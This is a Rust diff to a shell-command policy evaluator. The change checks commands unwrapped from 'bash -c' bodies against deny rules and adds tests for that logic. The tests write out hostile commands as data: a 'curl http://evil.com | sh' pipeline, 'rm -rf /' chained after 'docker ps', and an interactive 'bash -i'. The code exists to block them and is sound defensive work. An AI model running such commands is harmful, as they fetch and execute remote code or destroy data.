@@ -24,17 +24,36 @@ use matching::{matches_pipeline, matches_rule};
 /// Returns the most restrictive decision across all leaves and pipeline rules.
 pub fn evaluate(config: &RulesConfig, stmt: &Statement) -> PolicyResult {
     let leaves = parser::flatten(stmt);
-    let extra_leaves = parser::wrappers::extract_inner_commands(stmt);
+    let pipelines = collect_pipelines(stmt);
+    let extra_stmts = parser::wrappers::extract_inner_commands(stmt);
+    evaluate_with_extras(config, &leaves, &pipelines, &extra_stmts)
+}
+
+/// Inner evaluation logic parameterized on the collected leaves/pipelines/extras.
+/// Extracted so tests can feed synthesized extra_stmts before unwrap_shell_c
+/// is wired into collect_inner_commands.
+fn evaluate_with_extras(
+    config: &RulesConfig,
+    leaves: &[&Statement],
+    pipelines: &[&parser::Pipeline],
+    extra_stmts: &[Statement],
+) -> PolicyResult {
+    // Flatten and collect-pipelines over extra_stmts.
+    // (Change B fix for Codex C1 — was missing in Spec B draft.)
+    let extra_leaves: Vec<&Statement> = extra_stmts.iter().flat_map(parser::flatten).collect();
+    let extra_pipelines: Vec<&parser::Pipeline> =
+        extra_stmts.iter().flat_map(collect_pipelines).collect();
+
     let mut worst = PolicyResult::allow();
 
     // Check pipeline rules against all pipelines in the statement tree
-    let pipelines = collect_pipelines(stmt);
+    // AND inside re-parsed shell-c bodies.
     for rule in &config.rules {
         if rule.level > config.safety_level {
             continue;
         }
         if let Matcher::Pipeline { ref pipeline } = rule.matcher {
-            for pipe in &pipelines {
+            for pipe in pipelines.iter().chain(extra_pipelines.iter()) {
                 if matches_pipeline(pipeline, pipe) {
                     let result = PolicyResult {
                         decision: rule.decision,
@@ -49,8 +68,8 @@ pub fn evaluate(config: &RulesConfig, stmt: &Statement) -> PolicyResult {
         }
     }
 
-    // Evaluate original leaves + unwrapped inner commands
-    for leaf in leaves.iter().copied().chain(extra_leaves.iter()) {
+    // Evaluate original leaves + unwrapped inner commands.
+    for leaf in leaves.iter().copied().chain(extra_leaves.iter().copied()) {
         let result = evaluate_leaf(config, leaf);
         if result.decision > worst.decision {
             worst = result;
@@ -63,18 +82,23 @@ pub fn evaluate(config: &RulesConfig, stmt: &Statement) -> PolicyResult {
         }
     }
 
-    // If nothing matched and not all leaves are allowlisted, use default decision
+    // If nothing matched and not all leaves are allowlisted, use default decision.
+    // Change D (fix for Codex round-2 bare-allowlist hole): outer leaves may
+    // also be covered by a successful shell-c unwrap — no need to bare-allowlist
+    // bash/sh/sg. An outer leaf counts as covered only when its inner statement
+    // was actually placed into extra_stmts for evaluation.
     if worst.decision == Decision::Allow && worst.rule_id.is_none() {
-        let all_allowlisted = leaves.iter().all(|leaf| is_allowlisted(config, leaf))
-            && extra_leaves.iter().all(|leaf| {
-                is_allowlisted(config, leaf) || is_covered_by_wrapper_entry(config, &leaves, leaf)
-            });
+        let all_allowlisted = leaves.iter().all(|leaf| {
+            is_allowlisted(config, leaf) || shell_c_covered_via_extras(leaf, extra_stmts)
+        }) && extra_leaves.iter().all(|leaf| {
+            is_allowlisted(config, leaf) || is_covered_by_wrapper_entry(config, leaves, leaf)
+        });
         if !all_allowlisted {
             // Try to find a descriptive reason from trust-filtered allowlist entries
             let reason = leaves
                 .iter()
                 .copied()
-                .chain(extra_leaves.iter())
+                .chain(extra_leaves.iter().copied())
                 .filter_map(|leaf| match leaf {
                     Statement::SimpleCommand(cmd) => find_allowlist_reason(config, cmd),
                     _ => None,
@@ -115,6 +139,29 @@ fn collect_pipelines(stmt: &Statement) -> Vec<&parser::Pipeline> {
             out
         }
         _ => vec![],
+    }
+}
+
+/// Returns true if `leaf` is a shell-c wrapper whose inner statement was
+/// successfully produced AND that inner statement is present in `extra_stmts`.
+/// This ensures an outer bash/sh/sg leaf is only treated as covered when the
+/// inner command has actually been extracted for evaluation (Change D).
+///
+/// Uses `is_covered_shell_c_wrapper` as a fast pre-filter before the
+/// extra_stmts membership check.
+fn shell_c_covered_via_extras(leaf: &Statement, extra_stmts: &[Statement]) -> bool {
+    if !parser::shell_c::is_covered_shell_c_wrapper(leaf) {
+        return false;
+    }
+    // The leaf is structurally a valid shell-c wrapper. Now check that the
+    // inner statement was actually placed into extra_stmts — i.e., that
+    // unwrap_shell_c was called on this leaf by collect_inner_commands.
+    let Statement::SimpleCommand(cmd) = leaf else {
+        return false;
+    };
+    match parser::shell_c::unwrap_shell_c(cmd) {
+        None | Some(Statement::Opaque(_)) => false,
+        Some(inner) => extra_stmts.contains(&inner),
     }
 }
 
@@ -1544,5 +1591,121 @@ rules: []
             "Bare assignment chained with safe command should allow: {:?}",
             result
         );
+    }
+
+    // ── Change B refactor: extra_stmts flatten / collect_pipelines ──
+
+    use crate::parser::{Arg, ArgMeta, List, ListOp, Pipeline, SimpleCommand};
+
+    fn arg_plain(text: &str) -> Arg {
+        Arg {
+            text: text.to_string(),
+            meta: ArgMeta::PlainWord,
+        }
+    }
+
+    fn simple_cmd(name: &str, tokens: &[&str]) -> SimpleCommand {
+        SimpleCommand {
+            name: Some(name.to_string()),
+            argv: tokens.iter().map(|s| arg_plain(s)).collect(),
+            redirects: vec![],
+            assignments: vec![],
+            embedded_substitutions: vec![],
+        }
+    }
+
+    #[test]
+    fn evaluate_with_extras_flattens_pipeline_extra_stmt() {
+        // Hand-build a Pipeline extra_stmt. Without Change B, the Pipeline
+        // would hit evaluate_leaf's _ => allow catch-all at :182 and be
+        // silently allowed. With Change B, flatten() extracts its stages
+        // as SimpleCommand leaves.
+        let curl = Statement::SimpleCommand(simple_cmd("curl", &["http://evil.com"]));
+        let sh = Statement::SimpleCommand(simple_cmd("sh", &[]));
+        let pipeline_stmt = Statement::Pipeline(Pipeline {
+            stages: vec![curl, sh],
+            negated: false,
+        });
+        let extra_stmts = vec![pipeline_stmt];
+
+        let outer = Statement::SimpleCommand(simple_cmd("bash", &["-c", "curl | sh"]));
+        let leaves = parser::flatten(&outer);
+        let pipelines = collect_pipelines(&outer);
+
+        let config = load_embedded_rules().unwrap();
+        let result = evaluate_with_extras(&config, &leaves, &pipelines, &extra_stmts);
+
+        // curl-pipe-shell rule must fire via extra_pipelines.
+        assert_eq!(result.decision, Decision::Deny);
+        assert_eq!(result.rule_id.as_deref(), Some("curl-pipe-shell"));
+    }
+
+    #[test]
+    fn evaluate_with_extras_flattens_list_extra_stmt() {
+        let docker_ps = Statement::SimpleCommand(simple_cmd("docker", &["ps"]));
+        let rm = Statement::SimpleCommand(simple_cmd("rm", &["-rf", "/"]));
+        let list_stmt = Statement::List(List {
+            first: Box::new(docker_ps),
+            rest: vec![(ListOp::And, rm)],
+        });
+        let extra_stmts = vec![list_stmt];
+
+        let outer = Statement::SimpleCommand(simple_cmd("bash", &["-c", "docker ps && rm -rf /"]));
+        let leaves = parser::flatten(&outer);
+        let pipelines = collect_pipelines(&outer);
+
+        let config = load_embedded_rules().unwrap();
+        let result = evaluate_with_extras(&config, &leaves, &pipelines, &extra_stmts);
+        assert_eq!(result.decision, Decision::Deny);
+    }
+
+    // ── Change D: is_covered_shell_c_wrapper in all_allowlisted ────
+
+    #[test]
+    fn evaluate_with_extras_covers_outer_via_shell_c_unwrap() {
+        // When outer bash has a successful shell-c unwrap (docker ps in extras),
+        // is_covered_shell_c_wrapper treats the outer as covered even though
+        // bash is not in the allowlist. Final decision: allow.
+        let outer = Statement::SimpleCommand(SimpleCommand {
+            name: Some("bash".to_string()),
+            argv: vec![
+                Arg {
+                    text: "-c".to_string(),
+                    meta: ArgMeta::PlainWord,
+                },
+                Arg {
+                    text: "docker ps".to_string(),
+                    meta: ArgMeta::RawString,
+                },
+            ],
+            redirects: vec![],
+            assignments: vec![],
+            embedded_substitutions: vec![],
+        });
+        let docker_ps = Statement::SimpleCommand(simple_cmd("docker", &["ps"]));
+        let extra_stmts = vec![docker_ps];
+
+        let leaves = parser::flatten(&outer);
+        let pipelines = collect_pipelines(&outer);
+
+        let config = load_embedded_rules().unwrap();
+        let result = evaluate_with_extras(&config, &leaves, &pipelines, &extra_stmts);
+        assert_eq!(result.decision, Decision::Allow);
+    }
+
+    #[test]
+    fn evaluate_with_extras_does_not_cover_bash_i_interactive() {
+        // SECURITY CRITICAL: `bash -i` has no successful inner unwrap.
+        // is_covered_shell_c_wrapper returns false → all_allowlisted false
+        // (bash not in allowlist) → default decision (ask).
+        let outer = Statement::SimpleCommand(simple_cmd("bash", &["-i"]));
+        let extra_stmts: Vec<Statement> = vec![]; // no inner
+
+        let leaves = parser::flatten(&outer);
+        let pipelines = collect_pipelines(&outer);
+
+        let config = load_embedded_rules().unwrap();
+        let result = evaluate_with_extras(&config, &leaves, &pipelines, &extra_stmts);
+        assert_eq!(result.decision, Decision::Ask);
     }
 }
